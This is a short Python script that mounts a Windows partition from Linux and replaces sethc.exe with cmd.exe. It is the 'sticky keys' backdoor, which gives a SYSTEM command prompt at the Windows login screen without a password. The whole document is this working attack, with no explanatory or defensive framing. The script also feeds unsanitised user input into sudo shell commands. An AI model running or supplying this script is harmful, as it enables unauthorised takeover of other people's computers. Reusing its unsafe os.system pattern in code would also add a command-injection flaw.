import os

# List partitions
os.system('lsblk')

# Take user input for the partition to mount
partition = input("Enter the partition you want to mount (e.g., /dev/sda1): ")

# Create a mount point
mount_point = "/mnt/partition"
os.system(f'sudo mkdir -p {mount_point}')

# Mount the partition
os.system(f'sudo mount {partition} {mount_point}')

# Change directory to Windows/System32
os.chdir(f'{mount_point}/Windows/System32')

# Perform the copy operations
os.system('sudo cp sethc.exe sethc_backup.exe')
os.system('sudo cp cmd.exe sethc.exe')

print("Operations completed successfully.")
